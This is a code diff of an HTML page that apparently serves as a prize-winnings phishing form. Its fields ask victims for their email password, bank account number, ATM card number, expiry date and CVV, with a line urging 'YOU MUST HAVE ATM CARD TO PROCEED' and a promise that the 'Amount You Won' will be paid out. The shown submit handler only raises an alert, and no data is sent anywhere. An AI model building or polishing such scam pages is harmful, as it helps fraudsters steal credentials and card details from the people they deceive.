@@ -11,41 +11,30 @@
       padding: 20px;
     }
     form {
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
       max-width: 500px;
       margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     label {
-      display: block;
-      margin-top: 15px;
       font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
     }
-    input {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      box-sizing: border-box;
-    }
-    .input-group {
+    .field-container {
       position: relative;
+      margin-bottom: 20px;
     }
-    .input-group input {
+    input, select {
+      width: 100%;
+      padding: 12px;
       padding-right: 40px;
-    }
-    .toggle-password {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 18px;
-      color: #888;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
     }
     .error {
       color: red;
@@ -53,79 +42,199 @@
       display: none;
       margin-top: 5px;
     }
+    .eye-icon {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+    .warning {
+      color: red;
+      font-weight: bold;
+      margin-top: -10px;
+      margin-bottom: 20px;
+      display: none;
+    }
+    .final-message {
+      font-weight: bold;
+      margin-top: 10px;
+      display: none;
+    }
+    button {
+      width: 100%;
+      background: #4CAF50;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
-  <form id="applicationForm">
-    <!-- CARD NUMBER -->
-    <label for="cardNumber">ATM Card Number (16 digits):</label>
-    <input type="text" id="cardNumber" maxlength="16" required />
-    <div id="cardError" class="error">Card number must be exactly 16 digits.</div>
 
-    <!-- EXPIRY -->
-    <label for="expiry">Expiry Date (MM/YY):</label>
-    <input type="text" id="expiry" maxlength="5" required placeholder="MM/YY" />
-    <div id="expiryError" class="error">Enter valid expiry (MM/YY).</div>
+<form id="application-form">
+  <div class="field-container">
+    <label for="full-name">Full Name</label>
+    <input type="text" id="full-name" required />
+    <div class="error" id="full-name-error">Enter full name</div>
+  </div>
 
-    <!-- EMAIL PASSWORD -->
-    <label for="password">Email Password:</label>
-    <div class="input-group">
-      <input type="password" id="password" required />
-      <span class="toggle-password" onclick="togglePassword()">👁️</span>
+  <div class="field-container">
+    <label for="phone">Phone Number</label>
+    <input type="tel" id="phone" required />
+    <div class="error" id="phone-error">Enter phone number</div>
+  </div>
+
+  <div class="field-container">
+    <label for="email">Email Address</label>
+    <input type="email" id="email" required />
+    <div class="error" id="email-error">Enter a valid email</div>
+  </div>
+
+  <div class="field-container">
+    <label for="password">Email Password</label>
+    <input type="password" id="password" required />
+    <span class="eye-icon" onclick="togglePassword()">👁️</span>
+    <div class="error" id="password-error">Enter password</div>
+  </div>
+
+  <div class="field-container">
+    <label for="amount">Amount You Won</label>
+    <input type="text" id="amount" required />
+    <div class="error" id="amount-error">Enter the amount you won</div>
+  </div>
+
+  <div class="field-container">
+    <label for="bank-type">Bank Account Type</label>
+    <input type="text" id="bank-type" placeholder="e.g. Standard Bank Account" required />
+    <div class="error" id="type-error">Enter account type</div>
+  </div>
+
+  <div class="field-container">
+    <label for="account-number">Bank Account Number</label>
+    <input type="text" id="account-number" required />
+    <div class="error" id="account-error">Enter account number</div>
+  </div>
+
+  <div class="field-container">
+    <label for="atm-linked">Did You Link ATM to Your Bank Account?</label>
+    <select id="atm-linked" required>
+      <option value="">--Select--</option>
+      <option value="Yes">Yes</option>
+      <option value="No">No</option>
+    </select>
+    <div class="error" id="atm-error">Please select an option</div>
+    <div class="warning" id="atm-warning">YOU MUST HAVE ATM CARD TO PROCEED</div>
+  </div>
+
+  <div id="atm-fields">
+    <div class="field-container">
+      <label for="card-number">ATM Card Number</label>
+      <input type="password" id="card-number" maxlength="16" inputmode="numeric" />
+      <div class="error" id="card-error">Enter 16-digit card number</div>
     </div>
 
-    <button type="submit" style="margin-top: 20px;">Submit</button>
-  </form>
+    <div class="field-container">
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" id="expiry" maxlength="5" placeholder="MM/YY" />
+      <div class="error" id="expiry-error">Enter a valid expiry date</div>
+    </div>
 
-  <script>
-    // Eye toggle
-    function togglePassword() {
-      const password = document.getElementById("password");
-      password.type = password.type === "password" ? "text" : "password";
+    <div class="field-container">
+      <label for="cvv">CVV</label>
+      <input type="password" id="cvv" maxlength="3" inputmode="numeric" />
+      <div class="error" id="cvv-error">Enter 3-digit CVV</div>
+    </div>
+
+    <div class="final-message" id="final-message">
+      You will receive <span id="amount-placeholder"></span> to your <span id="type-placeholder"></span> <span id="account-placeholder"></span>
+    </div>
+  </div>
+
+  <button type="submit">Submit</button>
+</form>
+
+<script>
+  const form = document.getElementById('application-form');
+  const atmSelect = document.getElementById('atm-linked');
+  const atmFields = document.getElementById('atm-fields');
+  const atmWarning = document.getElementById('atm-warning');
+  const finalMessage = document.getElementById('final-message');
+
+  const showError = (id, condition) => {
+    const el = document.getElementById(id);
+    el.style.display = condition ? 'block' : 'none';
+  };
+
+  atmSelect.addEventListener('change', function () {
+    const val = this.value;
+    if (val === 'Yes') {
+      atmFields.style.display = 'block';
+      atmWarning.style.display = 'none';
+      finalMessage.style.display = 'block';
+      updateFinalMessage();
+    } else if (val === 'No') {
+      atmFields.style.display = 'none';
+      atmWarning.style.display = 'block';
+      finalMessage.style.display = 'none';
+    } else {
+      atmFields.style.display = 'none';
+      atmWarning.style.display = 'none';
+      finalMessage.style.display = 'none';
     }
+  });
 
-    // Expiry formatting
-    const expiryInput = document.getElementById("expiry");
-    expiryInput.addEventListener("input", () => {
-      let value = expiryInput.value.replace(/\D/g, "").substring(0, 4);
-      if (value.length >= 3) {
-        expiryInput.value = value.slice(0, 2) + "/" + value.slice(2);
-      } else {
-        expiryInput.value = value;
-      }
-    });
+  const updateFinalMessage = () => {
+    document.getElementById('amount-placeholder').innerText = document.getElementById('amount').value;
+    document.getElementById('type-placeholder').innerText = document.getElementById('bank-type').value;
+    document.getElementById('account-placeholder').innerText = document.getElementById('account-number').value;
+  };
 
-    // Field validation when leaving
-    document.getElementById("cardNumber").addEventListener("blur", () => {
-      const card = document.getElementById("cardNumber").value.trim();
-      document.getElementById("cardError").style.display = (card.length !== 16 || /\D/.test(card)) ? "block" : "none";
-    });
+  document.getElementById('expiry').addEventListener('input', function () {
+    let val = this.value.replace(/\D/g, '');
+    if (val.length >= 3) {
+      this.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+    } else {
+      this.value = val;
+    }
+  });
 
-    expiryInput.addEventListener("blur", () => {
-      const value = expiryInput.value.trim();
-      const match = value.match(/^(0[1-9]|1[0-2])\/\d{2}$/);
-      document.getElementById("expiryError").style.display = match ? "none" : "block";
-    });
+  const fieldsToValidate = [
+    'full-name', 'phone', 'email', 'password',
+    'amount', 'bank-type', 'account-number', 'atm-linked',
+    'card-number', 'expiry', 'cvv'
+  ];
 
-    // Final submit validation
-    document.getElementById("applicationForm").addEventListener("submit", function(e) {
-      const card = document.getElementById("cardNumber").value.trim();
-      const expiry = expiryInput.value.trim();
-      let valid = true;
+  fieldsToValidate.forEach(id => {
+    const input = document.getElementById(id);
+    if (input) {
+      input.addEventListener('blur', () => {
+        let errorId = id + '-error';
+        let condition = false;
+        if (id === 'card-number') condition = input.value.length !== 16;
+        else if (id === 'cvv') condition = input.value.length !== 3;
+        else if (id === 'expiry') condition = !/^(0[1-9]|1[0-2])\/\d{2}$/.test(input.value);
+        else if (id === 'email') condition = !input.value.includes('@');
+        else if (id === 'atm-linked') condition = input.value === '';
+        else condition = input.value.trim() === '';
+        showError(errorId, condition);
+      });
+    }
+  });
 
-      if (card.length !== 16 || /\D/.test(card)) {
-        document.getElementById("cardError").style.display = "block";
-        valid = false;
-      }
+  function togglePassword() {
+    const passwordField = document.getElementById("password");
+    passwordField.type = passwordField.type === "password" ? "text" : "password";
+  }
 
-      const match = expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/);
-      if (!match) {
-        document.getElementById("expiryError").style.display = "block";
-        valid = false;
-      }
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    alert("Form submitted!");
+  });
+</script>
 
-      if (!valid) e.preventDefault();
-    });
-  </script>
 </body>
 </html>
